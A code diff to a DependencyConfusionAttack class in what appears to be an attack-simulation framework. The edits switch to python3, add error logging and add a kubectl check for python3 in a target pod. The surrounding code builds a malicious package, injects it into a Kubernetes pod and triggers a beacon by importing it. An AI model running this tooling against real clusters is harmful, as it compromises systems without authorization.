@@ -296,7 +296,7 @@ class DependencyConfusionAttack(BaseAttack):
 
         if not self.dry_run:
             result = subprocess.run(
-                ["python", "setup.py", "bdist_wheel", "--quiet"],
+                ["python3", "setup.py", "bdist_wheel", "--quiet"],
                 cwd=str(pkg_dir),
                 capture_output=True,
                 text=True,
@@ -304,8 +304,17 @@ class DependencyConfusionAttack(BaseAttack):
                 check=False,
             )
             if result.returncode != 0:
+                log.error(
+                    "dependency_confusion.wheel_build_failed",
+                    extra={
+                        "returncode": result.returncode,
+                        "stdout": result.stdout[-500:] if result.stdout else "",
+                        "stderr": result.stderr[-500:] if result.stderr else "",
+                    },
+                )
                 raise RuntimeError(
-                    f"Failed to build confusion wheel: {result.stderr[:200]}"
+                    f"Failed to build confusion wheel (rc={result.returncode}): "
+                    f"{result.stderr[-200:]}"
                 )
         else:
             log.info("dep_confusion.dry_run.build_skipped")
@@ -411,6 +420,20 @@ class DependencyConfusionAttack(BaseAttack):
             extra={"namespace": target_namespace, "pod": pod_name},
         )
 
+        # Verify python3 is available in the target environment.
+        if not self.dry_run:
+            py3_check = subprocess.run(
+                ["kubectl", "exec", "-n", target_namespace, pod_name,
+                 "--", "python3", "--version"],
+                capture_output=True, text=True, check=False,
+            )
+            if py3_check.returncode != 0:
+                log.error(
+                    "dependency_confusion.python3_not_found",
+                    extra={"stderr": py3_check.stderr[:200]},
+                )
+                return False
+
         # 1. Build wheel.
         wheel_path = self._build_malicious_package()
 
@@ -454,7 +477,7 @@ class DependencyConfusionAttack(BaseAttack):
         self._kubectl_exec(
             namespace=target_namespace,
             pod_name=pod_name,
-            command=["python", "-c", f"import {_PKG_MODULE}; print({_PKG_MODULE}.__version__)"],
+            command=["python3", "-c", f"import {_PKG_MODULE}; print({_PKG_MODULE}.__version__)"],
             timeout=30,
         )
         log.info("dep_confusion.inject.beacon_triggered")
